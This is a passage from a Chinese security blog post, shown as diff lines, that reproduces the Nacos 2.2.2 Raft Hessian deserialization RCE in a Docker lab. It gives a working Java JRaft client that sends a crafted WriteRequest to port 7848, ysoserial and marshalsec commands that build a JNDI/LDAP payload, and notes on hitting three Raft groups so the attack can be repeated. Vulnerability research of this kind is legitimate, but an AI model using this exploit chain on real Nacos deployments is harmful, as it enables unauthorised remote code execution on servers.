&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>运行客户端后，便完成了一次gRPC请求和响应</p>
+<p><img src="/2023/06/09/Nacos-Raft-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230607235336573.png" alt="image-20230607235336573"></p>
+<h3 id="JRaft"><a href="#JRaft" class="headerlink" title="JRaft"></a>JRaft</h3><p><a target="_blank" rel="noopener" href="https://raft.github.io/">Raft</a>是一种共识算法，<a target="_blank" rel="noopener" href="https://www.sofastack.tech/projects/sofa-jraft/overview/">JRaft</a>是其Java实现，可以看一下官方的Demo</p>
+<h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p>Dockerfile</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/alibaba/nacos/releases/download/2.2.2/nacos-server-2.2.2.tar.gz">nacos-server-2.2.2.tar.gz</a></p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> openjdk:<span class="number">8</span>u342-jre</span><br><span class="line"></span><br><span class="line"><span class="keyword">ADD</span><span class="language-bash"> nacos-server-2.2.2.tar.gz /root</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt update &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    apt install net-tools procps -y</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /root</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>docker-compose.yml</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;3&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">nacos:</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">.</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">nacos</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">5005</span><span class="string">:5005</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">7848</span><span class="string">:7848</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">8848</span><span class="string">:8848</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">JAVA_OPT=-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005</span></span><br><span class="line">    <span class="attr">command:</span> </span><br><span class="line">      <span class="bullet">-</span> <span class="string">/bin/sh</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">-c</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">|</span></span><br><span class="line"><span class="string">        bash nacos/bin/startup.sh -m standalone</span></span><br><span class="line"><span class="string">        tail -f nacos/logs/start.out</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>修复代码中添加了Hessian反序列化白名单：<a target="_blank" rel="noopener" href="https://github.com/alibaba/nacos/pull/10542/files">https://github.com/alibaba/nacos/pull/10542/files</a></p>
+<p>那么最终反序列化的地方很清楚，即： </p>
+<p>com.alibaba.nacos.consistency.serialize.HessianSerializer#deserialize </p>
+<p>再根据<a target="_blank" rel="noopener" href="https://github.com/alibaba/nacos/releases/tag/2.2.3">漏洞描述</a>——“该漏洞仅影响7848端口（默认设置下），一般使用时该端口为Nacos集群间Raft协议的通信端口”，找到可能的漏洞触发点：</p>
+<blockquote>
+<p>在JRaft中，提交的任务最终将会复制应用到所有 raft 节点上的状态机。onApply 是StateMachine最核心的方法。</p>
+</blockquote>
+<p>com.alibaba.nacos.core.distributed.raft.NacosStateMachine#onApply</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onApply</span><span class="params">(Iterator iter)</span> &#123;</span><br><span class="line">  	...</span><br><span class="line">    <span class="keyword">if</span> (message <span class="keyword">instanceof</span> WriteRequest) &#123;</span><br><span class="line">        <span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> processor.onApply((WriteRequest) message);</span><br><span class="line">        postProcessor(response, closure);</span><br><span class="line">    &#125;</span><br><span class="line">  	...</span><br></pre></td></tr></table></figure>
+
+<p><code>processor.onApply</code>有多个实现，先看如下这个：</p>
+<p>com.alibaba.nacos.naming.core.v2.service.impl.PersistentClientOperationServiceImpl#onApply</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Response <span class="title function_">onApply</span><span class="params">(WriteRequest request)</span> &#123;</span><br><span class="line">		<span class="keyword">final</span> <span class="type">InstanceStoreRequest</span> <span class="variable">instanceRequest</span> <span class="operator">=</span> serializer.deserialize(request.getData().toByteArray());</span><br></pre></td></tr></table></figure>
+
+
+
+<p>另外在com.alibaba.nacos.naming.core.v2.service.impl.PersistentClientOperationServiceImpl中有个group方法如下，<code>NAMING_PERSISTENT_SERVICE_GROUP_V2</code>的值即<code>naming_persistent_service_v2</code>会在后面客户端的代码中用到</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">group</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> Constants.NAMING_PERSISTENT_SERVICE_GROUP_V2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>group()</code>是作为groupId用于创建RaftGroupService：</p>
+<p>com.alibaba.nacos.core.distributed.raft.JRaftServer#createMultiRaftGroup</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">createMultiRaftGroup</span><span class="params">(Collection&lt;RequestProcessor4CP&gt; processors)</span> &#123;</span><br><span class="line">		...</span><br><span class="line">    <span class="keyword">for</span> (RequestProcessor4CP processor : processors) &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">groupName</span> <span class="operator">=</span> processor.group();</span><br><span class="line">		...</span><br><span class="line">        <span class="type">RaftGroupService</span> <span class="variable">raftGroupService</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RaftGroupService</span>(groupName, localPeerId, copy, rpcServer, <span class="literal">true</span>);</span><br><span class="line">		...</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="构造请求"><a href="#构造请求" class="headerlink" title="构造请求"></a>构造请求</h3><p>在源码中并没有<code>WriteRequest</code>，<code>Response</code>等类的定义，他们都在nacos-2.2.2&#x2F;consistency&#x2F;src&#x2F;main&#x2F;proto&#x2F;consistency.proto 文件中，将该文件复制到文章开头创建的 grpc_demo 项目的proto目录中，借助protoc命令行工具生成代码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./protoc --plugin=protoc-gen-grpc-java --grpc-java_out=../java --java_out=../java consistency.proto</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/06/09/Nacos-Raft-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230608143518176.png" alt="image-20230608143518176"></p>
+<p>然后参考JRaft给出的<a target="_blank" rel="noopener" href="https://www.sofastack.tech/projects/sofa-jraft/counter-example/">Demo</a>，可以写出相应的客户端代码：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alipay.sofa<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jraft-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.3.12<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alipay.sofa<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>rpc-grpc-impl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.3.12<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.nacos.consistency.entity.WriteRequest;</span><br><span class="line"><span class="keyword">import</span> com.alipay.sofa.jraft.entity.PeerId;</span><br><span class="line"><span class="keyword">import</span> com.alipay.sofa.jraft.option.CliOptions;</span><br><span class="line"><span class="keyword">import</span> com.alipay.sofa.jraft.rpc.impl.GrpcClient;</span><br><span class="line"><span class="keyword">import</span> com.alipay.sofa.jraft.rpc.impl.MarshallerHelper;</span><br><span class="line"><span class="keyword">import</span> com.alipay.sofa.jraft.rpc.impl.cli.CliClientServiceImpl;</span><br><span class="line"><span class="keyword">import</span> com.google.protobuf.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">App</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">( String[] args )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">address</span> <span class="operator">=</span> <span class="string">&quot;127.0.0.1:7848&quot;</span>;</span><br><span class="line">        <span class="type">byte</span>[] poc = getPoc();</span><br><span class="line"></span><br><span class="line">        <span class="type">CliClientServiceImpl</span> <span class="variable">cliClientService</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CliClientServiceImpl</span>();</span><br><span class="line">        cliClientService.init(<span class="keyword">new</span> <span class="title class_">CliOptions</span>());</span><br><span class="line">        <span class="type">PeerId</span> <span class="variable">leader</span> <span class="operator">=</span> PeerId.parsePeer(address);</span><br><span class="line"></span><br><span class="line">        <span class="type">WriteRequest</span> <span class="variable">request</span> <span class="operator">=</span> WriteRequest.newBuilder()</span><br><span class="line">                .setGroup(<span class="string">&quot;naming_persistent_service_v2&quot;</span>)</span><br><span class="line">                .setData(ByteString.copyFrom(poc))</span><br><span class="line">                .build();</span><br><span class="line"></span><br><span class="line">        <span class="type">GrpcClient</span> <span class="variable">grpcClient</span> <span class="operator">=</span> (GrpcClient) cliClientService.getRpcClient();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//反射添加WriteRequest，不然会抛出异常</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">parserClassesField</span> <span class="operator">=</span> GrpcClient.class.getDeclaredField(<span class="string">&quot;parserClasses&quot;</span>);</span><br><span class="line">        parserClassesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Map&lt;String, Message&gt; parserClasses = (Map) parserClassesField.get(grpcClient);</span><br><span class="line">        parserClasses.put(WriteRequest.class.getName(),WriteRequest.getDefaultInstance());</span><br><span class="line">        MarshallerHelper.registerRespInstance(WriteRequest.class.getName(),WriteRequest.getDefaultInstance());</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">res</span> <span class="operator">=</span> grpcClient.invokeSync(leader.getEndpoint(), request,<span class="number">5000</span>);</span><br><span class="line">        System.out.println(res);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="断点调试"><a href="#断点调试" class="headerlink" title="断点调试"></a>断点调试</h3><p>可以在关键的几处下断点观察：</p>
+<p>com.alibaba.nacos.core.distributed.raft.NacosStateMachine#onApply</p>
+<p>com.alibaba.nacos.naming.core.v2.service.impl.PersistentClientOperationServiceImpl#onApply</p>
+<p>com.alibaba.nacos.consistency.serialize.HessianSerializer#deserialize(byte[])</p>
+<h3 id="Gadget"><a href="#Gadget" class="headerlink" title="Gadget"></a>Gadget</h3><p>目前只是成功让代码走到反序列化的点，还需要构造Hession反序列化的POC：</p>
+<ol>
+<li>通过<a target="_blank" rel="noopener" href="https://github.com/l3yx/JNDI-Injection-LDAP-Deserialization">JNDI-Injection-LDAP-Deserialization</a>启动恶意ldap服务，并使用y4er师傅改的<a target="_blank" rel="noopener" href="https://github.com/Y4er/ysoserial">ysoserial</a>中Jackson这条链</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-LDAP-Deserialization-1.0-SNAPSHOT.jar 1389 `java -jar ~/Tools/Y4er_ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar Jackson <span class="string">&#x27;touch /tmp/success&#x27;</span>|<span class="built_in">base64</span>`</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>然后通过<a target="_blank" rel="noopener" href="https://github.com/mbechler/marshalsec">marshasec</a>生成JDNI注入的POC</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.Hessian2 SpringPartiallyComparableAdvisorHolder ldap://host.docker.internal:1389/exp |<span class="built_in">base64</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/06/09/Nacos-Raft-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230609132153478.png" alt="image-20230609132153478"></p>
+<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>其实前面很多分析过程是有省略的，感觉都写下来会很乱，所以挑了一条漏洞的链路完成漏洞的复现，准备在后面补充一些细节</p>
+<h3 id="只能打一次？"><a href="#只能打一次？" class="headerlink" title="只能打一次？"></a>只能打一次？</h3><p>按前文的POC第一次攻击7848端口的话，调用栈如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">deserialize(byte[]), HessianSerializer</span><br><span class="line">onApply(WriteRequest), PersistentClientOperationServiceImpl </span><br><span class="line">onApply(Iterator), NacosStateMachine</span><br><span class="line">doApplyTasks(IteratorImpl), FSMCallerImpl</span><br><span class="line">doCommitted(long), FSMCallerImpl</span><br><span class="line">runApplyTask(FSMCallerImpl$ApplyTask, long, boolean), FSMCallerImpl</span><br><span class="line">access$100(FSMCallerImpl, FSMCallerImpl$ApplyTask, long, boolean), FSMCallerImpl</span><br><span class="line">onEvent(FSMCallerImpl$ApplyTask, long, boolean), FSMCallerImpl$ApplyTaskHandler</span><br><span class="line">onEvent(Object, long, boolean), FSMCallerImpl$ApplyTaskHandler</span><br><span class="line">run(), BatchEventProcessor</span><br></pre></td></tr></table></figure>
+
+<p>JRaft客户端得到的返回数据是反序列化中的异常信息，说明已经完成反序列化过程，这里没有问题</p>
+<p><img src="/2023/06/09/Nacos-Raft-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230609140240776.png" alt="image-20230609140240776"></p>
+<p>但是同样的POC，运行第二次，返回信息是：</p>
+<p><img src="/2023/06/09/Nacos-Raft-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230609140705427.png" alt="image-20230609140705427"></p>
+<p>并且代码无法进入上述调用栈，感觉这里可能和Raft的算法或者协议有关，重启环境也不行。需要销毁环境，重新创建：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose down; docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="多条触发链路"><a href="#多条触发链路" class="headerlink" title="多条触发链路"></a>多条触发链路</h3><p>在前文中提到的com.alibaba.nacos.core.distributed.raft.JRaftServer#createMultiRaftGroup中创建RaftGroupService的地方下断点，并且对环境进行销毁重启，在重启的同时IDEA连上调试</p>
+<p><img src="/2023/06/09/Nacos-Raft-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230609141722996.png" alt="image-20230609141722996"></p>
+<p><img src="/2023/06/09/Nacos-Raft-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230609141748714.png" alt="image-20230609141748714"></p>
+<p><img src="/2023/06/09/Nacos-Raft-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230609141822866.png" alt="image-20230609141822866"></p>
+<p>会发现其实不只存在一个RaftGroupService：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">naming_persistent_service_v2</span><br><span class="line">naming_instance_metadata</span><br><span class="line">naming_service_metadata</span><br></pre></td></tr></table></figure>
+
+
+
+<p>他们分别对应的”onApply”如下：</p>
+<p>com.alibaba.nacos.naming.core.v2.service.impl.PersistentClientOperationServiceImpl#onApply</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Response <span class="title function_">onApply</span><span class="params">(WriteRequest request)</span> &#123;</span><br><span class="line">		<span class="keyword">final</span> <span class="type">InstanceStoreRequest</span> <span class="variable">instanceRequest</span> <span class="operator">=</span> serializer.deserialize(request.getData().toByteArray());</span><br></pre></td></tr></table></figure>
+
+
+
+<p>com.alibaba.nacos.naming.core.v2.metadata.InstanceMetadataProcessor#onApply</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Response <span class="title function_">onApply</span><span class="params">(WriteRequest request)</span> &#123;</span><br><span class="line">    MetadataOperation&lt;InstanceMetadata&gt; op = serializer.deserialize(request.getData().toByteArray(), processType);</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
+
+
+
+<p>com.alibaba.nacos.naming.core.v2.metadata.ServiceMetadataProcessor#onApply</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Response <span class="title function_">onApply</span><span class="params">(WriteRequest request)</span> &#123;</span><br><span class="line">		MetadataOperation&lt;ServiceMetadata&gt; op = serializer.deserialize(request.getData().toByteArray(), processType);</span><br><span class="line">  	...</span><br></pre></td></tr></table></figure>
+
+
+
+<p>都有反序列化操作，所以，打完一个”group”后，可以打另外一个”group”，这样漏洞至少可以打3次：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">WriteRequest</span> <span class="variable">request</span> <span class="operator">=</span> WriteRequest.newBuilder()</span><br><span class="line">        .setGroup(<span class="string">&quot;naming_persistent_service_v2&quot;</span>)</span><br><span class="line">        <span class="comment">//.setGroup(&quot;naming_instance_metadata&quot;)</span></span><br><span class="line">        <span class="comment">//.setGroup(&quot;naming_service_metadata&quot;)</span></span><br><span class="line">        .setData(ByteString.copyFrom(poc))</span><br><span class="line">        .build();</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://y4er.com/posts/nacos-hessian-rce/">https://y4er.com/posts/nacos-hessian-rce/</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="tag"># 漏洞分析</a>
+              <a href="/tags/Nacos/" rel="tag"># Nacos</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2023/05/20/Tabby%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96gadget%E5%88%86%E6%9E%90/" rel="prev" title="Tabby学习笔记 & Java反序列化gadget分析">
+                  <i class="fa fa-angle-left"></i> Tabby学习笔记 & Java反序列化gadget分析
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2023/06/15/RocketMQ-5-1-1%E5%86%99%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1RCE/" rel="next" title="RocketMQ 5.1.1写计划任务RCE">
+                  RocketMQ 5.1.1写计划任务RCE <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">淚笑</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
